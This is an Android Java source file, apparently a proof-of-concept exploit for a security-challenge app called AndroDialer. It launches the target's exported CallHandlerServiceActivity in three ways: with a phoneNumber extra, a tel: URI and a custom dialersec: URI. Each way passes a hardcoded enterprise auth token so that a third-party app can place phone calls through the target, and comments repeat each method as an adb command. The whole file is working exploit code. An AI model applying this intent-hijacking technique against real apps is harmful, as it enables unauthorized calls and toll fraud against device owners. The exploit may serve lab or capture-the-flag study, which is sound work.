package com.nasr.androdialerpoc;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private static final String TARGET_PACKAGE = "com.eightksec.androdialer";
    private static final String TARGET_ACTIVITY = "com.eightksec.androdialer.CallHandlerServiceActivity";
    private static final String TOKEN = "8kd1aL3R_s3Cur3_k3Y_2023";
    private static final String PHONE_NUMBER = "1234567890";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnMethod1 = findViewById(R.id.btn_method1);
        Button btnMethod2 = findViewById(R.id.btn_method2);
        Button btnMethod3 = findViewById(R.id.btn_method3);

        btnMethod1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                method1();
            }
        });

        btnMethod2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                method2();
            }
        });

        btnMethod3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                method3();
            }
        });
    }

    private void method1() {
        try {
            // Method 1 – Using the phoneNumber Extra
            // adb shell am start -n com.eightksec.androdialer/.CallHandlerServiceActivity \
            //    -a android.intent.action.VIEW \
            //    --es enterprise_auth_token "8kd1aL3R_s3Cur3_k3Y_2023" \
            //    --es phoneNumber 1234567890
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
            intent.putExtra("enterprise_auth_token", TOKEN);
            intent.putExtra("phoneNumber", PHONE_NUMBER);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "Method 1 executed", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private void method2() {
        try {
            // Method 2 – Using a tel: URI
            // adb shell am start -n com.eightksec.androdialer/.CallHandlerServiceActivity \
            //    -a android.intent.action.VIEW \
            //    -d "tel:1234567890" \
            //    --es enterprise_auth_token "8kd1aL3R_s3Cur3_k3Y_2023"
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
            intent.setData(Uri.parse("tel:" + PHONE_NUMBER));
            intent.putExtra("enterprise_auth_token", TOKEN);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "Method 2 executed", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private void method3() {
        try {
            // Method 3 – Using a dialersec URI with a Query Parameter
            // adb shell am start -n com.eightksec.androdialer/.CallHandlerServiceActivity \
            //    -a android.intent.action.VIEW \
            //    -d "dialersec://call/number/1234567890?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023"
            Uri uri = Uri.parse("dialersec://call/number/" + PHONE_NUMBER + "?enterprise_auth_token=" + TOKEN);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
            intent.setData(uri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "Method 3 executed", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }
}